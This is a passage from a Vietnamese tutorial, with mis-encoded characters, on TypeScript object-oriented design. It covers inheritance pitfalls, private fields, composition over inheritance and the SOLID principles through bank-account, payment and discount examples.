     - ThÃªm tÃ­nh nÄƒng má»›i pháº£i hiá»ƒu cáº£ hierarchy
   - **VÃ­ dá»¥ BAD**:
     ```typescript
     class Animal {}
     class Mammal extends Animal {}
     class Carnivore extends Mammal {}
     class Feline extends Carnivore {}
     class Cat extends Feline {}
     class PersianCat extends Cat {} // QUÃ SÃ‚U! 6 táº§ng
     ```
   - **Váº¥n Ä‘á» thá»±c táº¿**:
     - Sá»­a `Animal` â†’ pháº£i test láº¡i 5 classes con
     - ThÃªm method trong `Mammal` â†’ cÃ³ thá»ƒ break `PersianCat`
   - **Giáº£i phÃ¡p**: Giá»›i háº¡n 2-3 táº§ng, prefer composition

2. **âŒ Tight Coupling (LiÃªn káº¿t Cháº·t cháº½)**

   - **Giáº£i thÃ­ch**: Subclass phá»¥ thuá»™c cháº·t cháº½ vÃ o parent â†’ thay Ä‘á»•i parent cÃ³ thá»ƒ break child
   - **Váº¥n Ä‘á»**:
     - Cannot remove/change parent methods (children Ä‘ang dÃ¹ng)
     - Subclass biáº¿t quÃ¡ nhiá»u vá» parent internals
     - KhÃ³ refactor
   - **VÃ­ dá»¥ BAD**:

     ```typescript
     class UserService extends Logger {
       registerUser() {
         this.log('Registering...'); // Phá»¥ thuá»™c vÃ o Logger.log()
       }
     }

     // Náº¿u Logger.log() Ä‘á»•i signature â†’ UserService break!
     ```

   - **Váº¥n Ä‘á» thá»±c táº¿**:
     - `Admin extends User` â†’ náº¿u User thÃªm required param trong constructor â†’ táº¥t cáº£ subclasses pháº£i update
     - `PremiumAccount extends BankAccount` â†’ náº¿u BankAccount Ä‘á»•i cÃ¡ch tÃ­nh balance â†’ PremiumAccount cÃ³ thá»ƒ sai
   - **Giáº£i phÃ¡p**: DÃ¹ng composition thay vÃ¬ inheritance

3. **âŒ Fragile Base Class Problem (Váº¥n Ä‘á» Class Cha Dá»… vá»¡)**

   - **Giáº£i thÃ­ch**: Thay Ä‘á»•i nhá» trong parent class cÃ³ thá»ƒ break táº¥t cáº£ children classes
   - **Váº¥n Ä‘á»**:
     - Sá»­a bug trong parent â†’ introduce bugs trong children
     - KhÃ´ng dÃ¡m refactor parent vÃ¬ sá»£ break children
     - Side effects khÃ´ng mong muá»‘n
   - **VÃ­ dá»¥ BAD**:

     ```typescript
     class Counter {
       count = 0;
       increment() {
         this.count++;
       }
       incrementTwice() {
         this.increment();
         this.increment();
       }
     }

     class SpecialCounter extends Counter {
       increment() {
         super.increment();
         console.log('Incremented!'); // Log má»—i láº§n increment
       }
     }

     const counter = new SpecialCounter();
     counter.incrementTwice(); // Logs 2 láº§n (expected)

     // âŒ Náº¿u parent refactor incrementTwice():
     // incrementTwice() { this.count += 2; }
     // â†’ KHÃ”NG gá»i increment() ná»¯a â†’ SpecialCounter KHÃ”NG log!
     ```

   - **Váº¥n Ä‘á» thá»±c táº¿**:
     - Parent thÃªm validation trong method â†’ children override mÃ  quÃªn gá»i `super()` â†’ bypass validation
     - Parent Ä‘á»•i order cá»§a operations â†’ children expect old order â†’ behavior sai
   - **Giáº£i phÃ¡p**: Document parent behavior, use protected methods carefully

4. **âŒ Memory Overhead (Tá»‘n Bá»™ nhá»›) - TrÆ°á»›c ES6**

   - **Giáº£i thÃ­ch**: TrÆ°á»›c ES6 (khÃ´ng cÃ³ class syntax), má»—i instance duplicate methods â†’ tá»‘n memory
   - **Váº¥n Ä‘á»**:
     - Táº¡o 1000 objects â†’ 1000 copies cá»§a cÃ¹ng 1 method
     - Memory usage tÄƒng tuyáº¿n tÃ­nh vá»›i sá»‘ instances
   - **VÃ­ dá»¥ BAD (Pre-ES6)**:

     ```typescript
     function User(name) {
       this.name = name;
       this.login = function () {
         // âŒ Method trong constructor
         console.log('Logging in...');
       };
     }

     const user1 = new User('A');
     const user2 = new User('B');
     // user1.login !== user2.login (2 copies khÃ¡c nhau!)
     ```

   - **Giáº£i thÃ­ch**:
     - Má»—i instance cÃ³ 1 copy riÃªng cá»§a `login()` method
     - 1000 users â†’ 1000 copies â†’ waste memory
   - **Giáº£i phÃ¡p (ES6+)**:

     ```typescript
     class User {
       constructor(name) {
         this.name = name;
       }
       login() {
         // âœ… Method trÃªn prototype
         console.log('Logging in...');
       }
     }

     // Táº¥t cáº£ instances share 1 login() trÃªn prototype
     // user1.login === user2.login (cÃ¹ng 1 method!)
     ```

   - **LÆ°u Ã½**: ES6 classes tá»± Ä‘á»™ng Ä‘áº·t methods trÃªn prototype â†’ khÃ´ng cÃ²n váº¥n Ä‘á» nÃ y

5. **âŒ Harder Debugging (KhÃ³ Debug hÆ¡n)**

   - **Giáº£i thÃ­ch**: Method lookup qua prototype chain â†’ khÃ³ trace method Ä‘Æ°á»£c gá»i tá»« Ä‘Ã¢u
   - **Váº¥n Ä‘á»**:
     - Stack trace dÃ i, nhiá»u táº§ng
     - KhÃ´ng biáº¿t method override á»Ÿ Ä‘Ã¢u
     - Breakpoint pháº£i set nhiá»u nÆ¡i
   - **VÃ­ dá»¥**:

     ```typescript
     class A {
       method() {
         console.log('A');
       }
     }

     class B extends A {
       method() {
         super.method(); // Gá»i A.method()
         console.log('B');
       }
     }

     class C extends B {
       method() {
         super.method(); // Gá»i B.method() â†’ gá»i A.method()
         console.log('C');
       }
     }

     new C().method();
     // Stack trace: C.method() â†’ B.method() â†’ A.method()
     // Pháº£i trace qua 3 táº§ng Ä‘á»ƒ hiá»ƒu flow
     ```

   - **Váº¥n Ä‘á» thá»±c táº¿**:
     - Bug trong `PremiumAccount.withdraw()` â†’ pháº£i check cáº£ `BankAccount.withdraw()`
     - Method Ä‘Æ°á»£c override á»Ÿ nhiá»u levels â†’ khÃ´ng biáº¿t Ä‘ang cháº¡y implementation nÃ o
     - Debugging tools hiá»ƒn thá»‹ prototype chain phá»©c táº¡p
   - **Giáº£i phÃ¡p**:
     - Giá»›i háº¡n inheritance depth (2-3 táº§ng max)
     - Document override behavior rÃµ rÃ ng
     - Use composition khi cÃ³ thá»ƒ

**ChÃº thÃ­ch:**

**ğŸ”’ Private Fields `#` (Thá»±c sá»± Private):**

- Syntax: `#fieldName` (báº¯t Ä‘áº§u báº±ng dáº¥u `#`)
- **KhÃ´ng thá»ƒ truy cáº­p** tá»« bÃªn ngoÃ i class, ká»ƒ cáº£ subclass
- KhÃ¡c `_prefix` (chá»‰ lÃ  convention, váº«n access Ä‘Æ°á»£c)
- VÃ­ dá»¥: `account.#balance` â†’ âŒ Error

**ğŸ”— `extends` (Káº¿ thá»«a):**

- Táº¡o class con káº¿ thá»«a tá»« class cha
- Táº¡o **prototype chain**: Child.prototype â†’ Parent.prototype
- Child cÃ³ táº¥t cáº£ properties/methods cá»§a Parent
- VÃ­ dá»¥: `class Admin extends User { ... }`

**â¬†ï¸ `super` (Gá»i Parent):**

- Trong constructor: `super()` gá»i parent constructor (báº¯t buá»™c gá»i trÆ°á»›c `this`)
- Trong method: `super.methodName()` gá»i parent method
- VÃ­ dá»¥:
  ```typescript
  constructor(name) {
    super(name); // Gá»i User constructor
    this.role = 'admin';
  }
  ```

**ğŸ§© Composition > Inheritance (Æ¯u tiÃªn Káº¿t há»£p hÆ¡n Káº¿ thá»«a):**

- **Inheritance**: "Is-a" relationship (Admin **lÃ ** User)
- **Composition**: "Has-a" relationship (UserService **cÃ³** Logger)
- Composition linh hoáº¡t hÆ¡n, Ã­t tight coupling hÆ¡n
- Dá»… test hÆ¡n (mock dependencies)
- VÃ­ dá»¥:

  ```typescript
  // âŒ Inheritance: phá»¥ thuá»™c parent
  class UserService extends Logger {}

  // âœ… Composition: inject dependency
  class UserService {
    constructor(private logger: Logger) {}
  }
  ```

**ğŸ“ SOLID Principles (Giáº£i thÃ­ch Ä‘Æ¡n giáº£n):**

1. **Single Responsibility (TrÃ¡ch nhiá»‡m ÄÆ¡n láº»)**

   - 1 class chá»‰ lÃ m 1 viá»‡c duy nháº¥t
   - Dá»… hiá»ƒu, dá»… maintain, dá»… test
   - VÃ­ dá»¥: `UserValidator` chá»‰ validate, `UserRepository` chá»‰ save/load

2. **Open/Closed (Má»Ÿ-ÄÃ³ng)**

   - Má»Ÿ cho **extension** (thÃªm tÃ­nh nÄƒng má»›i)
   - ÄÃ³ng cho **modification** (khÃ´ng sá»­a code cÅ©)
   - DÃ¹ng abstract class/interface Ä‘á»ƒ extend
   - VÃ­ dá»¥: ThÃªm `BuyOneGetOne` discount mÃ  khÃ´ng sá»­a class `Discount`

3. **Liskov Substitution (Thay tháº¿ Liskov)**

   - Subclass pháº£i thay tháº¿ Ä‘Æ°á»£c parent mÃ  khÃ´ng break code
   - Child pháº£i tuÃ¢n thá»§ "contract" cá»§a parent
   - VÃ­ dá»¥: `CreditCardPayment` vÃ  `BankTransferPayment` Ä‘á»u work vá»›i `PaymentMethod`

4. **Interface Segregation (TÃ¡ch Interface)**

   - Nhiá»u interfaces nhá» > 1 interface lá»›n
   - Class chá»‰ implement methods cáº§n thiáº¿t
   - VÃ­ dá»¥: `IReadable`, `IWritable`, `IDeletable` riÃªng biá»‡t thay vÃ¬ 1 interface cÃ³ táº¥t cáº£

5. **Dependency Inversion (Äáº£o ngÆ°á»£c Phá»¥ thuá»™c)**
   - Phá»¥ thuá»™c vÃ o **abstractions** (interfaces/abstract classes)
   - KhÃ´ng phá»¥ thuá»™c vÃ o **concretions** (concrete classes)
   - Dá»… swap implementations, dá»… test
   - VÃ­ dá»¥: `OrderService` nháº­n `ILogger` (interface) thay vÃ¬ `ConsoleLogger` (concrete)

**Code Example (TypeScript):**

```typescript
// ============================================
// 1. BASIC CLASS WITH ENCAPSULATION (ÄÃ³ng gÃ³i)
// ============================================
// ğŸ¦ VÃ­ dá»¥: TÃ i khoáº£n ngÃ¢n hÃ ng - áº©n sá»‘ dÆ° bÃªn trong
class BankAccount {
  // ğŸ”’ Private field: chá»‰ class nÃ y access Ä‘Æ°á»£c
  #balance: number = 0; // Sá»‘ dÆ° (truly private)

  constructor(
    public readonly accountNumber: string, // Sá»‘ tÃ i khoáº£n (readonly: khÃ´ng sá»­a Ä‘Æ°á»£c)
    private owner: string // Chá»§ tÃ i khoáº£n (private: chá»‰ trong class)
  ) {
    // accountNumber lÃ  public â†’ cÃ³ thá»ƒ Ä‘á»c: account.accountNumber
    // owner lÃ  private â†’ KHÃ”NG thá»ƒ Ä‘á»c tá»« bÃªn ngoÃ i: account.owner âŒ
  }

  // ğŸ’° Public method: gá»­i tiá»n (deposit = náº¡p tiá»n)
  deposit(amount: number): void {
    if (amount <= 0) throw new Error('Sá»‘ tiá»n pháº£i > 0');
    this.#balance += amount; // Cá»™ng vÃ o sá»‘ dÆ°
    console.log(`âœ… ÄÃ£ náº¡p ${amount}Ä‘. Sá»‘ dÆ°: ${this.#balance}Ä‘`);
  }

  // ğŸ’¸ Public method: rÃºt tiá»n (withdraw = rÃºt)
  withdraw(amount: number): void {
    if (amount > this.#balance) {
      throw new Error('Sá»‘ dÆ° khÃ´ng Ä‘á»§!');
    }
    this.#balance -= amount; // Trá»« sá»‘ dÆ°
    console.log(`âœ… ÄÃ£ rÃºt ${amount}Ä‘. CÃ²n láº¡i: ${this.#balance}Ä‘`);
  }

  // ğŸ“Š Public method: xem sá»‘ dÆ° (getBalance = láº¥y sá»‘ dÆ°)
  getBalance(): number {
    return this.#balance; // Chá»‰ Ä‘á»c, khÃ´ng sá»­a Ä‘Æ°á»£c tá»« bÃªn ngoÃ i
  }
}

// ğŸ¯ Sá»­ dá»¥ng class
const account = new BankAccount('123456', 'Nguyá»…n VÄƒn A');
account.deposit(1000); // âœ… Náº¡p 1000Ä‘
console.log(account.getBalance()); // 1000
account.withdraw(300); // âœ… RÃºt 300Ä‘

// âŒ KHÃ”NG thá»ƒ truy cáº­p trá»±c tiáº¿p private field
// console.log(account.#balance);  // âŒ Error: Private field '#balance' must be declared in an enclosing class
// console.log(account.owner);     // âŒ Error: Property 'owner' is private
console.log(account.accountNumber); // âœ… OK: '123456' (public readonly)

// ============================================
// 2. INHERITANCE (Káº¿ thá»«a) & POLYMORPHISM (Äa hÃ¬nh)
// ============================================
// ğŸ’ TÃ i khoáº£n Premium: káº¿ thá»«a BankAccount + thÃªm tÃ­nh nÄƒng má»›i
class PremiumAccount extends BankAccount {
  private creditLimit: number; // Háº¡n má»©c tÃ­n dá»¥ng (credit limit)

  constructor(accountNumber: string, owner: string, creditLimit: number) {
    // â¬†ï¸ super() Báº®T BUá»˜C gá»i TRÆ¯á»šC khi dÃ¹ng 'this'
    super(accountNumber, owner); // Gá»i constructor cá»§a BankAccount
    this.creditLimit = creditLimit;
  }

  // ğŸ”„ Override (ghi Ä‘Ã¨) method withdraw cá»§a parent (Polymorphism)
  withdraw(amount: number): void {
    // ğŸ’¡ PremiumAccount cÃ³ thá»ƒ rÃºt quÃ¡ sá»‘ dÆ° nhá» credit limit
    const available = this.getBalance() + this.creditLimit;

    if (amount > available) {
      throw new Error(`VÆ°á»£t háº¡n má»©c! Kháº£ dá»¥ng: ${available}Ä‘`);
    }

    // RÃºt sá»‘ dÆ° trÆ°á»›c
    const balanceToWithdraw = Math.min(amount, this.getBalance());
    if (balanceToWithdraw > 0) {
      super.withdraw(balanceToWithdraw); // Gá»i method cá»§a parent
    }

    // Náº¿u cÃ²n thiáº¿u â†’ dÃ¹ng credit
    const creditUsed = amount - balanceToWithdraw;
    if (creditUsed > 0) {
      console.log(`ğŸ’³ Sá»­ dá»¥ng credit: ${creditUsed}Ä‘`);
    }
  }

  // â• Method Má»šI chá»‰ cÃ³ á»Ÿ PremiumAccount (khÃ´ng cÃ³ á»Ÿ BankAccount)
  getCreditInfo() {
    return {
      balance: this.getBalance(), // Sá»‘ dÆ° hiá»‡n táº¡i
      creditLimit: this.creditLimit, // Háº¡n má»©c tÃ­n dá»¥ng
      available: this.getBalance() + this.creditLimit, // Tá»•ng kháº£ dá»¥ng
    };
  }
}

// ğŸ¯ Sá»­ dá»¥ng inheritance
const premium = new PremiumAccount('789', 'Tráº§n Thá»‹ B', 5000);
premium.deposit(2000); // âœ… CÃ³ method tá»« parent (BankAccount)
premium.withdraw(3000); // âœ… Override: rÃºt quÃ¡ sá»‘ dÆ° nhá» credit
console.log(premium.getCreditInfo()); // âœ… Method má»›i cá»§a PremiumAccount
// Output: { balance: 0, creditLimit: 5000, available: 5000 }

// ğŸ“ Giáº£i thÃ­ch Polymorphism:
// - BankAccount.withdraw() â†’ chá»‰ rÃºt trong sá»‘ dÆ°
// - PremiumAccount.withdraw() â†’ rÃºt cáº£ credit limit (behavior khÃ¡c)
// CÃ¹ng tÃªn method nhÆ°ng hÃ nh vi khÃ¡c nhau!

// ============================================
// 3. ABSTRACT CLASS (Lá»›p Trá»«u tÆ°á»£ng) & INTERFACE
// ============================================
// ğŸ“ Abstract class: KHÃ”NG thá»ƒ táº¡o instance trá»±c tiáº¿p, chá»‰ Ä‘á»ƒ káº¿ thá»«a
abstract class PaymentMethod {
  constructor(public provider: string) {} // provider = nhÃ  cung cáº¥p (Visa, Mastercard, VNPay...)

  // ğŸ”´ Abstract method: Báº®T BUá»˜C implement á»Ÿ subclass
  // KhÃ´ng cÃ³ implementation (body) á»Ÿ Ä‘Ã¢y
  abstract processPayment(amount: number): Promise<boolean>;

  // âœ… Concrete method: cÃ³ implementation, cÃ¡c subclass dÃ¹ng chung
  validateAmount(amount: number): boolean {
    return amount > 0 && amount < 1_000_000; // Giá»›i háº¡n 1 triá»‡u
  }
}

// ğŸ“‹ Interface: "há»£p Ä‘á»“ng" (contract) - class implement pháº£i cÃ³ Ä‘á»§ methods
interface IRefundable {
  refund(transactionId: string): Promise<void>; // HoÃ n tiá»n
}

// ğŸ’³ Thanh toÃ¡n tháº» tÃ­n dá»¥ng: extends abstract class + implements interface
class CreditCardPayment extends PaymentMethod implements IRefundable {
  constructor(
    provider: string, // VD: 'Visa', 'Mastercard'
    private cardNumber: string // Sá»‘ tháº»
  ) {
    super(provider); // Gá»i constructor cá»§a PaymentMethod
  }

  // âœ… Implement abstract method (Báº®T BUá»˜C)
  async processPayment(amount: number): Promise<boolean> {
    // Validate báº±ng method cá»§a parent
    if (!this.validateAmount(amount)) {
      console.log('âŒ Sá»‘ tiá»n khÃ´ng há»£p lá»‡!');
      return false;
    }

    // Xá»­ lÃ½ thanh toÃ¡n tháº»
    console.log(`ğŸ’³ Äang charge ${amount}Ä‘ vÃ o tháº» ${this.cardNumber}...`);
    // Gá»i API gateway (VNPay, Stripe...)
    return true;
  }

  // âœ… Implement interface IRefundable
  async refund(transactionId: string): Promise<void> {
    console.log(`ğŸ’° Äang hoÃ n tiá»n giao dá»‹ch ${transactionId}...`);
    // Logic hoÃ n tiá»n...
  }
}

// ğŸ¦ Chuyá»ƒn khoáº£n ngÃ¢n hÃ ng: chá»‰ extends abstract class (KHÃ”NG implement IRefundable)
class BankTransferPayment extends PaymentMethod {
  constructor(
    provider: string, // VD: 'VCB', 'ACB'
    private bankCode: string // MÃ£ ngÃ¢n hÃ ng
  ) {
    super(provider);
  }

  // âœ… Implement abstract method (Báº®T BUá»˜C)
  async processPayment(amount: number): Promise<boolean> {
    if (!this.validateAmount(amount)) return false;

    console.log(`ğŸ¦ Äang chuyá»ƒn khoáº£n ${amount}Ä‘ qua ${this.bankCode}...`);
    return true;
  }

  // âŒ KHÃ”NG cÃ³ method refund() vÃ¬ khÃ´ng implement IRefundable
  // (Chuyá»ƒn khoáº£n thÆ°á»ng khÃ´ng hoÃ n tiá»n tá»± Ä‘á»™ng)
}

// ğŸ¯ Sá»­ dá»¥ng
const creditCard = new CreditCardPayment('Visa', '4111-1111-1111-1111');
await creditCard.processPayment(500_000); // âœ… Thanh toÃ¡n
await creditCard.refund('TXN123'); // âœ… HoÃ n tiá»n

const bankTransfer = new BankTransferPayment('VietcomBank', '970436');
await bankTransfer.processPayment(1_000_000); // âœ… Chuyá»ƒn khoáº£n
// await bankTransfer.refund('TXN456');      // âŒ Error: khÃ´ng cÃ³ method refund()

// ============================================
// 4. COMPOSITION OVER INHERITANCE (Tá»I Æ¯U NHáº¤T!)
// ============================================
// âŒ BAD: Deep inheritance hierarchy (CÃ¢y káº¿ thá»«a sÃ¢u - khÃ³ maintain)
class Animal {} // Äá»™ng váº­t
class Mammal extends Animal {} // Äá»™ng váº­t cÃ³ vÃº
class Dog extends Mammal {} // ChÃ³
class Labrador extends Dog {} // ChÃ³ Labrador - QUÃ SÃ‚U! KhÃ³ hiá»ƒu vÃ  maintain

// ğŸ¤” Váº¥n Ä‘á»:
// - Náº¿u sá»­a Animal â†’ áº£nh hÆ°á»Ÿng táº¥t cáº£ classes con
// - Tight coupling: Labrador phá»¥ thuá»™c vÃ o Dog, Mammal, Animal
// - KhÃ³ test: pháº£i setup cáº£ chain

// âœ… GOOD: Composition pattern (Káº¿t há»£p - linh hoáº¡t hÆ¡n)
// ğŸ“ Äá»‹nh nghÄ©a interfaces (contracts)
interface ILogger {
  log(message: string): void; // Ghi log
}

interface IEmailService {
  sendEmail(to: string, subject: string): Promise<void>; // Gá»­i email
}

// ğŸ”§ Implementations cá»¥ thá»ƒ
class ConsoleLogger implements ILogger {
  log(message: string): void {
    console.log(`[LOG] ${new Date().toISOString()}: ${message}`);
  }
}

class EmailService implements IEmailService {
  async sendEmail(to: string, subject: string): Promise<void> {
    console.log(`ğŸ“§ Gá»­i email Ä‘áº¿n ${to}: ${subject}`);
    // Gá»i API SendGrid, AWS SES, SMTP...
  }
}

// ğŸ¯ UserService: COMPOSE (káº¿t há»£p) thay vÃ¬ INHERIT (káº¿ thá»«a)
// "Has-a" relationship thay vÃ¬ "Is-a"
class UserService {
  // ğŸ’‰ Dependency Injection: inject qua constructor
  constructor(
    private logger: ILogger, // UserService HAS-A logger
    private emailService: IEmailService // UserService HAS-A emailService
  ) {
    // âœ… Æ¯u Ä‘iá»ƒm:
    // - Dá»… swap implementation (ConsoleLogger â†’ FileLogger)
    // - Dá»… test (inject mock logger, mock emailService)
    // - Loose coupling (khÃ´ng phá»¥ thuá»™c concrete classes)
  }

  async registerUser(email: string, password: string): Promise<void> {
    this.logger.log(`ğŸš€ Äang Ä‘Äƒng kÃ½ user: ${email}`);

    // Logic Ä‘Äƒng kÃ½ user...
    // 1. Validate email/password
    // 2. Hash password
    // 3. LÆ°u vÃ o database

    // Gá»­i email chÃ o má»«ng
    await this.emailService.sendEmail(email, 'ChÃ o má»«ng báº¡n Ä‘áº¿n vá»›i ná»n táº£ng!');

    this.logger.log(`âœ… User Ä‘Ã£ Ä‘Äƒng kÃ½ thÃ nh cÃ´ng: ${email}`);
  }
}

// ğŸ¯ Sá»­ dá»¥ng Dependency Injection
const userService = new UserService(
  new ConsoleLogger(), // Inject logger implementation
  new EmailService() // Inject email implementation
);

await userService.registerUser('user@example.com', 'password123');

// ğŸ’¡ Dá»… dÃ ng thay Ä‘á»•i implementation:
class FileLogger implements ILogger {
  log(message: string): void {
    // Ghi vÃ o file thay vÃ¬ console
  }
}

const userServiceWithFileLog = new UserService(
  new FileLogger(), // âœ… Swap logger â†’ khÃ´ng cáº§n sá»­a UserService!
  new EmailService()
);

// ğŸ§ª Dá»… dÃ ng test vá»›i mocks:
class MockLogger implements ILogger {
  logs: string[] = [];
  log(message: string): void {
    this.logs.push(message); // LÆ°u logs Ä‘á»ƒ verify
  }
}

class MockEmailService implements IEmailService {
  sentEmails: Array<{ to: string; subject: string }> = [];
  async sendEmail(to: string, subject: string): Promise<void> {
    this.sentEmails.push({ to, subject }); // LÆ°u emails Ä‘á»ƒ verify
  }
}

const mockLogger = new MockLogger();
const mockEmailService = new MockEmailService();
const testService = new UserService(mockLogger, mockEmailService);

await testService.registerUser('test@example.com', 'pass');
console.log(mockLogger.logs); // Verify logs
console.log(mockEmailService.sentEmails); // Verify emails sent

// ============================================
// 5. SOLID PRINCIPLES IN ACTION (CÃ¡c NguyÃªn Táº¯c SOLID)
// ============================================

// ğŸ“ S - Single Responsibility Principle (NguyÃªn táº¯c TrÃ¡ch nhiá»‡m ÄÆ¡n)
// "Má»—i class chá»‰ lÃ m 1 viá»‡c duy nháº¥t"

// âŒ BAD: God class - lÃ m quÃ¡ nhiá»u viá»‡c
class UserManager {
  validateEmail(email: string): boolean {
    /* ... */
  } // 1. Validate
  hashPassword(password: string): string {
    /* ... */
  } // 2. Hash
  saveToDatabase(user: any): void {
    /* ... */
  } // 3. Database
  sendWelcomeEmail(email: string): void {
    /* ... */
  } // 4. Email
  logActivity(message: string): void {
    /* ... */
  } // 5. Logging
  // TOO MANY RESPONSIBILITIES!
}

// âœ… GOOD: TÃ¡ch ra thÃ nh nhiá»u classes, má»—i class 1 trÃ¡ch nhiá»‡m
class User {
  // Chá»‰ chá»©a data (entity/model)
  constructor(
    public id: string,
    public email: string,
    public password: string
  ) {}
}

class UserValidator {
  // CHá»ˆ lÃ m validate
  validate(user: User): boolean {
    return user.email.includes('@') && user.password.length >= 8;
  }
}

class UserRepository {
  // CHá»ˆ lÃ m database operations
  async save(user: User): Promise<void> {
    console.log('ğŸ’¾ LÆ°u user vÃ o database...');
    // Database logic: INSERT INTO users...
  }

  async findById(id: string): Promise<User | null> {
    console.log(`ğŸ” TÃ¬m user theo ID: ${id}`);
    // Database logic: SELECT * FROM users WHERE id = ?
    return null;
  }
}

// ğŸ’¡ Lá»£i Ã­ch:
// - Dá»… hiá»ƒu: Ä‘á»c tÃªn class lÃ  biáº¿t lÃ m gÃ¬
// - Dá»… maintain: sá»­a validation â†’ chá»‰ sá»­a UserValidator
// - Dá»… test: test tá»«ng class riÃªng biá»‡t
// - Dá»… reuse: UserValidator cÃ³ thá»ƒ dÃ¹ng cho nhiá»u nÆ¡i

// ğŸ“ O - Open/Closed Principle (NguyÃªn táº¯c Má»Ÿ-ÄÃ³ng)
// "Má»Ÿ cho má»Ÿ rá»™ng (extension), Ä‘Ã³ng cho sá»­a Ä‘á»•i (modification)"

// âŒ BAD: Pháº£i sá»­a code má»—i khi thÃªm discount type má»›i
class DiscountCalculator {
  calculate(price: number, type: string, value: number): number {
    if (type === 'percentage') {
      return price * (1 - value / 100);
    } else if (type === 'fixed') {
      return price - value;
    } else if (type === 'bogo') {
      // ThÃªm type má»›i â†’ PHáº¢I Sá»¬A CODE
      return price / 2;
    }
    return price;
  }
}

// âœ… GOOD: DÃ¹ng abstract class + inheritance
abstract class Discount {
  abstract calculate(price: number): number; // Abstract method
}

// 1ï¸âƒ£ Giáº£m giÃ¡ theo %
class PercentageDiscount extends Discount {
  constructor(private percent: number) {
    super();
  }

  calculate(price: number): number {
    return price * (1 - this.percent / 100);
  }
}

// 2ï¸âƒ£ Giáº£m giÃ¡ cá»‘ Ä‘á»‹nh
class FixedDiscount extends Discount {
  constructor(private amount: number) {
    super();
  }

  calculate(price: number): number {
    return Math.max(0, price - this.amount);
  }
}

// 3ï¸âƒ£ Mua 1 táº·ng 1 (Buy One Get One)
class BuyOneGetOne extends Discount {
  calculate(price: number): number {
    return price / 2;
  }
}

// 4ï¸âƒ£ ThÃªm discount type Má»šI â†’ KHÃ”NG Cáº¦N Sá»¬A code cÅ©!
class SeasonalDiscount extends Discount {
  constructor(private multiplier: number) {
    super();
  }

  calculate(price: number): number {
    return price * this.multiplier;
  }
}

// ğŸ¯ Sá»­ dá»¥ng
function applyDiscount(price: number, discount: Discount): number {
  return discount.calculate(price); // Polymorphism
}

const price = 100_000;
console.log(applyDiscount(price, new PercentageDiscount(20))); // 80,000
console.log(applyDiscount(price, new FixedDiscount(15_000))); // 85,000
console.log(applyDiscount(price, new BuyOneGetOne())); // 50,000
console.log(applyDiscount(price, new SeasonalDiscount(0.7))); // 70,000

// ğŸ’¡ Lá»£i Ã­ch:
// - ThÃªm tÃ­nh nÄƒng má»›i â†’ chá»‰ cáº§n thÃªm class má»›i
// - KHÃ”NG sá»­a code cÅ© â†’ khÃ´ng risk break existing features
// - TuÃ¢n thá»§ Open/Closed: Open for extension, Closed for modification

// ğŸ“ L - Liskov Substitution Principle (NguyÃªn táº¯c Thay tháº¿ Liskov)
// "Subclass pháº£i thay tháº¿ Ä‘Æ°á»£c parent mÃ  khÃ´ng lÃ m break code"

// âŒ BAD: Subclass vi pháº¡m "contract" cá»§a parent
abstract class Bird {
  abstract fly(): void; // Táº¥t cáº£ birds Ä‘á»u fly
}

class Sparrow extends Bird {
  fly(): void {
    console.log('ğŸ¦ Chim sáº» bay!');
  }
}

class Penguin extends Bird {
  fly(): void {
    // âŒ Chim cÃ¡nh cá»¥t KHÃ”NG bay Ä‘Æ°á»£c!
    throw new Error('Penguins cannot fly!');
  }
}

function makeBirdFly(bird: Bird) {
  bird.fly(); // Expect táº¥t cáº£ birds Ä‘á»u fly
}

makeBirdFly(new Sparrow()); // âœ… OK
makeBirdFly(new Penguin()); // âŒ Error! Violate LSP

// âœ… GOOD: Subclass tuÃ¢n thá»§ parent contract
abstract class PaymentMethod {
  abstract processPayment(amount: number): Promise<boolean>;

  validateAmount(amount: number): boolean {
    return amount > 0 && amount < 1_000_000;
  }
}

class CreditCardPayment extends PaymentMethod {
  constructor(private provider: string, private cardNumber: string) {
    super();
  }

  async processPayment(amount: number): Promise<boolean> {
    console.log(`ğŸ’³ Thanh toÃ¡n ${amount}Ä‘ qua tháº» ${this.provider}`);
    return true; // âœ… TuÃ¢n thá»§ contract: return boolean
  }
}

class BankTransferPayment extends PaymentMethod {
  constructor(private bank: string, private bankCode: string) {
    super();
  }

  async processPayment(amount: number): Promise<boolean> {
    console.log(`ğŸ¦ Chuyá»ƒn khoáº£n ${amount}Ä‘ qua ${this.bank}`);
    return true; // âœ… TuÃ¢n thá»§ contract: return boolean
  }
}

// ğŸ¯ Function cháº¥p nháº­n Báº¤T Ká»² PaymentMethod nÃ o
async function processPayment(method: PaymentMethod, amount: number) {
  // Works vá»›i Táº¤T Cáº¢ subclasses â†’ LSP satisfied
  if (method.validateAmount(amount)) {
    const success = await method.processPayment(amount);
    console.log(success ? 'âœ… ThÃ nh cÃ´ng' : 'âŒ Tháº¥t báº¡i');
  }
}

// âœ… Cáº£ 2 Ä‘á»u work perfect (Liskov Substitution)
await processPayment(new CreditCardPayment('Visa', '1234'), 100_000);
await processPayment(new BankTransferPayment('ACB', '970416'), 200_000);

// ğŸ’¡ Lá»£i Ã­ch:
// - Code predictable: subclass behave nhÆ° parent
// - Safe refactoring: thay parent â†’ subclass mÃ  khÃ´ng break
// - Polymorphism Ä‘Ãºng nghÄ©a: "nhiá»u hÃ¬nh dáº¡ng, cÃ¹ng interface"

// ğŸ“ I - Interface Segregation Principle (NguyÃªn táº¯c TÃ¡ch Interface)
// "Nhiá»u interfaces nhá» > 1 interface lá»›n"
// "Class chá»‰ implement methods cáº§n thiáº¿t, khÃ´ng bá»‹ Ã©p implement methods khÃ´ng dÃ¹ng"

// âŒ BAD: Interface quÃ¡ lá»›n, Ã©p implement methods khÃ´ng cáº§n
interface IFile {
  read(): string;
  write(data: string): void;
  delete(): void;
  compress(): void;
  encrypt(): void;
}

// ReadOnlyFile bá»‹ Ã©p implement write/delete/compress/encrypt (khÃ´ng cáº§n!)
class ReadOnlyFile implements IFile {
  read(): string {
    return 'file content';
  }

  write(data: string): void {
    throw new Error('Read-only!'); // âŒ KhÃ´ng cáº§n nhÆ°ng pháº£i implement
  }

  delete(): void {
    throw new Error('Cannot delete!'); // âŒ KhÃ´ng cáº§n nhÆ°ng pháº£i implement
  }

  compress(): void {
    throw new Error('Cannot compress!'); // âŒ KhÃ´ng cáº§n nhÆ°ng pháº£i implement
  }

  encrypt(): void {
    throw new Error('Cannot encrypt!'); // âŒ KhÃ´ng cáº§n nhÆ°ng pháº£i implement
  }
}

// âœ… GOOD: TÃ¡ch thÃ nh nhiá»u interfaces nhá», focused
interface IReadable {
  read(): string;
}

interface IWritable {
